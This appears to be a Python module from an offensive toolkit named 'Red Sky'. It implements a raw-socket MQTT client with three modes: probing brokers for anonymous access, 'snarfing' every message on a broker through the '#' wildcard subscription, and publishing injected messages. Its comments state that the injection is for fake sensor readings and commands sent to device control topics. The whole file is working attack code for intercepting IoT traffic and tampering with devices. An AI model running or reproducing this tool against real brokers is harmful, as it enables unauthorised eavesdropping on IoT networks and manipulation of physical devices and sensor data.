# language: Python, file: Program/iot/mqtt.py, target: Red Sky IoT — MQTT attack
# Raw-socket MQTT 3.1.1 client. No paho dependency — the wire format is
# simple enough that building it directly is shorter than the library.
#
# Modes:
#   probe     — connect with no credentials, list topics seen in a short
#               subscribe window. Open brokers are still depressingly common
#               on IoT deployments.
#   snarf     — subscribe # and dump every message to a JSONL for the
#               duration. The MQTT "shell" of an IoT network.
#   publish   — send a message to a topic (payload + retain flag). Used for
#               topic injection (fake sensor readings) or command injection
#               into device control topics.

import json
import socket
import struct
import sys
import time
from pathlib import Path
from typing import Dict, List, Optional, Tuple

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import print_ok, print_err, print_info, print_warn, print_kv
from Program.utils.paths import OUTPUT_DIR


IOT_DIR = OUTPUT_DIR / "iot"
MQTT_DIR = IOT_DIR / "mqtt"


# ── wire format ─────────────────────────────────────────────────────────────
# fixed header: byte 0 = type<<4 | flags, then remaining-length (varint)
# connect: variable header (proto name "MQTT", level 4, flags, keepalive)
#          then payload (client id, [will topic, will msg], [user], [pass])

PKT_CONNECT     = 1
PKT_CONNACK     = 2
PKT_PUBLISH     = 3
PKT_PUBACK      = 4
PKT_SUBSCRIBE   = 8
PKT_SUBACK      = 9
PKT_PINGREQ     = 12
PKT_PINGRESP    = 13
PKT_DISCONNECT  = 14


def _encode_len(n: int) -> bytes:
    """MQTT variable-length integer — up to 4 bytes."""
    out = bytearray()
    while True:
        b = n % 128
        n //= 128
        if n > 0:
            b |= 0x80
        out.append(b)
        if n == 0:
            break
    return bytes(out)


def _read_len(sock: socket.socket) -> int:
    mult = 1
    val = 0
    for _ in range(4):
        b = sock.recv(1)
        if not b:
            raise ConnectionError("eof reading length")
        digit = b[0]
        val += (digit & 0x7F) * mult
        if not (digit & 0x80):
            return val
        mult *= 128
    raise ValueError("malformed length")


def _pack_str(s: str) -> bytes:
    b = s.encode("utf-8")
    return struct.pack("!H", len(b)) + b


def build_connect(client_id: str, user: str = "", pw: str = "",
                  keepalive: int = 30, clean: bool = True) -> bytes:
    flags = 0
    if clean:
        flags |= 0x02
    payload = _pack_str(client_id)
    if user:
        flags |= 0x80
        payload += _pack_str(user)
    if pw:
        flags |= 0x40
        payload += _pack_str(pw)
    vh = _pack_str("MQTT") + bytes([4, flags]) + struct.pack("!H", keepalive)
    body = vh + payload
    return bytes([PKT_CONNECT << 4]) + _encode_len(len(body)) + body


def build_subscribe(pkt_id: int, topic: str, qos: int = 0) -> bytes:
    vh = struct.pack("!H", pkt_id)
    payload = _pack_str(topic) + bytes([qos])
    body = vh + payload
    # fixed header flags for SUBSCRIBE are 0b0010
    return bytes([(PKT_SUBSCRIBE << 4) | 0x02]) + _encode_len(len(body)) + body


def build_publish(topic: str, payload: bytes, qos: int = 0, retain: bool = False) -> bytes:
    flags = (qos & 0x03) << 1
    if retain:
        flags |= 0x01
    vh = _pack_str(topic)
    if qos > 0:
        vh += struct.pack("!H", 1)  # packet id
    body = vh + payload
    return bytes([(PKT_PUBLISH << 4) | flags]) + _encode_len(len(body)) + body


def build_disconnect() -> bytes:
    return bytes([PKT_DISCONNECT << 4, 0])


def build_pingreq() -> bytes:
    return bytes([PKT_PINGREQ << 4, 0])


# ── connection ──────────────────────────────────────────────────────────────

def connect_mqtt(host: str, port: int, client_id: str,
                 user: str = "", pw: str = "",
                 timeout: int = 8) -> Optional[socket.socket]:
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.settimeout(timeout)
        s.sendall(build_connect(client_id, user, pw))
        # read CONNACK: 4 bytes minimum
        head = s.recv(1)
        if not head or head[0] != (PKT_CONNACK << 4):
            s.close()
            return None
        _ = _read_len(s)  # remaining length
        body = s.recv(2)
        if len(body) < 2:
            s.close()
            return None
        rc = body[1]
        if rc != 0:
            s.close()
            return None
        return s
    except Exception:
        return None


def _read_packet(s: socket.socket) -> Tuple[int, int, bytes]:
    """Returns (type, flags, body). Raises on EOF."""
    h = s.recv(1)
    if not h:
        raise ConnectionError("eof")
    b0 = h[0]
    ptype = b0 >> 4
    flags = b0 & 0x0F
    rl = _read_len(s)
    body = b""
    while len(body) < rl:
        chunk = s.recv(rl - len(body))
        if not chunk:
            raise ConnectionError("eof body")
        body += chunk
    return ptype, flags, body


def _decode_publish(flags: int, body: bytes) -> Tuple[str, bytes]:
    tl = struct.unpack("!H", body[:2])[0]
    topic = body[2:2+tl].decode("utf-8", errors="replace")
    off = 2 + tl
    qos = (flags >> 1) & 0x03
    if qos > 0:
        off += 2
    payload = body[off:]
    return topic, payload


# ── commands ────────────────────────────────────────────────────────────────

def cmd_probe(host: str, port: int, user: str, pw: str, seconds: int) -> int:
    MQTT_DIR.mkdir(parents=True, exist_ok=True)
    cid = "redsky-" + str(int(time.time()))
    s = connect_mqtt(host, port, cid, user, pw)
    if not s:
        print_err("connect failed (auth required, or port closed, or not MQTT)")
        return 1
    print_ok("connected (anon-clean)")
    print_kv("broker", host + ":" + str(port))

    # subscribe to #
    s.sendall(build_subscribe(1, "#", 0))
    seen_topics = set()
    end = time.time() + seconds
    print_info("subscribed to # — listening " + str(seconds) + "s")
    while time.time() < end:
        try:
            ptype, flags, body = _read_packet(s)
        except (socket.timeout, ConnectionError):
            continue
        if ptype == PKT_PUBLISH:
            topic, payload = _decode_publish(flags, body)
            if topic not in seen_topics:
                seen_topics.add(topic)
                print("  " + SCARLET + topic + RESET + " " + ASH + str(len(payload)) + "B" + RESET)
    s.sendall(build_disconnect())
    s.close()
    print()
    print_kv("topics seen", len(seen_topics))
    return 0


def cmd_snarf(host: str, port: int, user: str, pw: str, seconds: int, out: str) -> int:
    MQTT_DIR.mkdir(parents=True, exist_ok=True)
    ts = time.strftime("%Y%m%d_%H%M%S")
    out_path = Path(out) if out else MQTT_DIR / ("snarf_" + ts + ".jsonl")
    cid = "redsky-" + str(int(time.time()))
    s = connect_mqtt(host, port, cid, user, pw)
    if not s:
        print_err("connect failed")
        return 1
    print_ok("connected")
    print_kv("broker", host + ":" + str(port))
    print_kv("out", out_path)

    s.sendall(build_subscribe(1, "#", 0))
    end = time.time() + seconds
    n = 0
    with out_path.open("w") as f:
        while time.time() < end:
            try:
                ptype, flags, body = _read_packet(s)
            except (socket.timeout, ConnectionError):
                continue
            if ptype == PKT_PUBLISH:
                topic, payload = _decode_publish(flags, body)
                rec = {
                    "ts": time.time(),
                    "topic": topic,
                    "payload_len": len(payload),
                    "payload_b64": __import__("base64").b64encode(payload).decode(),
                }
                f.write(json.dumps(rec) + "\n")
                n += 1
                if n % 100 == 0:
                    print("  " + ASH + str(n) + " messages" + RESET)
    s.sendall(build_disconnect())
    s.close()
    print()
    print_ok("messages captured: " + str(n))
    print_kv("out", out_path)
    return 0


def cmd_publish(host: str, port: int, user: str, pw: str,
                topic: str, message: str, retain: bool) -> int:
    cid = "redsky-" + str(int(time.time()))
    s = connect_mqtt(host, port, cid, user, pw)
    if not s:
        print_err("connect failed")
        return 1
    payload = message.encode()
    if message.startswith("@"):
        p = Path(message[1:])
        if p.exists():
            payload = p.read_bytes()
            print_info("payload loaded from " + str(p) + " (" + str(len(payload)) + "B)")
    s.sendall(build_publish(topic, payload, qos=0, retain=retain))
    time.sleep(0.3)
    s.sendall(build_disconnect())
    s.close()
    print_ok("published")
    print_kv("topic", topic)
    print_kv("bytes", len(payload))
    print_kv("retain", "yes" if retain else "no")
    return 0


def run_cli(args):
    import argparse
    sub = args[0] if args else "help"
    rest = args[1:] if args else []

    if sub in ("-h", "--help", "help"):
        print_info("redsky iot mqtt <sub-command>")
        print_info("")
        print_info("  probe   --host H [--port 1883] [--user U] [--pw P] [--seconds 15]")
        print_info("      connect + list topics seen on # for N seconds")
        print_info("  snarf   --host H [--port 1883] [--seconds 60] [--out FILE]")
        print_info("      subscribe # and dump every message to JSONL")
        print_info("  publish --host H --topic T --message 'text' [--retain]")
        print_info("      publish a payload; --message @file loads from disk")
        return 0

    base = argparse.ArgumentParser(add_help=False)
    base.add_argument("--host", required=False, default="")
    base.add_argument("--port", type=int, default=1883)
    base.add_argument("--user", default="")
    base.add_argument("--pw", default="")

    if sub == "probe":
        p = argparse.ArgumentParser(prog="redsky iot mqtt probe", parents=[base], add_help=False)
        p.add_argument("--seconds", type=int, default=15)
        try:
            ns = p.parse_args(rest)
        except SystemExit:
            print_err("usage: redsky iot mqtt probe --host H [--port 1883] [--seconds 15]")
            return 2
        if not ns.host:
            print_err("--host required")
            return 2
        return cmd_probe(ns.host, ns.port, ns.user, ns.pw, ns.seconds)

    if sub == "snarf":
        p = argparse.ArgumentParser(prog="redsky iot mqtt snarf", parents=[base], add_help=False)
        p.add_argument("--seconds", type=int, default=60)
        p.add_argument("--out", default="")
        try:
            ns = p.parse_args(rest)
        except SystemExit:
            print_err("usage: redsky iot mqtt snarf --host H [--seconds 60] [--out FILE]")
            return 2
        if not ns.host:
            print_err("--host required")
            return 2
        return cmd_snarf(ns.host, ns.port, ns.user, ns.pw, ns.seconds, ns.out)

    if sub == "publish":
        p = argparse.ArgumentParser(prog="redsky iot mqtt publish", parents=[base], add_help=False)
        p.add_argument("--topic", required=False, default="")
        p.add_argument("--message", required=False, default="")
        p.add_argument("--retain", action="store_true")
        try:
            ns = p.parse_args(rest)
        except SystemExit:
            print_err("usage: redsky iot mqtt publish --host H --topic T --message 'text' [--retain]")
            return 2
        if not ns.host or not ns.topic or not ns.message:
            print_err("--host, --topic, --message required")
            return 2
        return cmd_publish(ns.host, ns.port, ns.user, ns.pw, ns.topic, ns.message, ns.retain)

    print_err("unknown mqtt sub-command: " + sub)
    return 2


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
